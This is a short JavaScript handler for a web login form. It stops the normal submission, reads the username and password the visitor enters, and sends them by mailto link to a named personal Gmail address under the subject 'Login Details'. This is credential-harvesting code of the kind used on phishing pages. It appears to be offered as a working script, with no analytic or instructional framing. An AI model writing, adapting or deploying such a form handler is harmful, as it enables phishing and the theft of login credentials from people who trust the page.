document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const emailBody = `Username: ${username}\nPassword: ${password}`;

    window.location.href = `mailto:alexandiel1984@gmail.com?subject=Login%20Details&body=${encodeURIComponent(emailBody)}`;
});
